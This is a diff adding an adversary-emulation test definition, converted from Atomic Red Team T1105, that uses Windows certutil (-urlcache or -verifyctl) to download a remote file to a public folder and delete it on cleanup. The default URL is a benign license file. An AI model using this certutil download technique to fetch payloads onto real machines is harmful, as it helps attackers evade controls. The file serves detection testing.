@@ -1,0 +1,55 @@
+# Converted from Atomic Red Team - Ingress Tool Transfer
+# Source: https://www.atomicredteam.io/atomic-red-team/atomics/T1105
+# Original auto_generated_guids: dd3b61dd-7bbc-48cd-ab51-49ad1a776df0, ffd492e3-0455-4518-9fb1-46527c9f241b
+
+---
+api_version: 2.0
+uuid: 2cc94101-67ab-4cf3-a3c1-4429817ec924
+name: certutil download (urlcache)
+authors:
+  - isaac_fletcher
+  - Atomic Red Team
+description: |
+  Use certutil -urlcache argument to download a file from the web. Note - /urlcache also works!
+
+mitre:
+  tactics:
+    - "TA0011 Command and Control"
+  techniques:
+    - "T1105 Ingress Tool Transfer"
+
+requirements:
+  platforms:
+    - os: windows
+
+args:
+  - name: method
+    description: Method to use for download (urlcache, verifyctl)
+    type: string
+    choices:
+      - "urlcache"
+      - "verifyctl"
+    default: "urlcache"
+  - name: remote_file
+    description: URL of file to copy
+    type: string
+    default: "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/dd526047b8c399c312fee47d1e6fb531164da54d/LICENSE.txt"
+  - name: local_file
+    description: Local file path to save downloaded file
+    type: path
+    default: "C:\\Users\\Public\\malicious.bin"
+
+steps:
+  - name: download_file_with_certutil
+    executor: powershell.exe
+    inline: |
+      {{ if eq .Args.method "urlcache" }}
+      cmd /c certutil -urlcache -split -f {{.Args.remote_file}} {{.Args.local_file}}
+
+      {{ else if eq .Args.method "verifyctl" }}
+      certutil -verifyctl -split -f {{.Args.remote_file}} {{.Args.local_file}}
+      {{ end }}
+    cleanup:
+      executor: cmd.exe
+      inline: |
+        del {{.Args.local_file}} >nul 2>&1
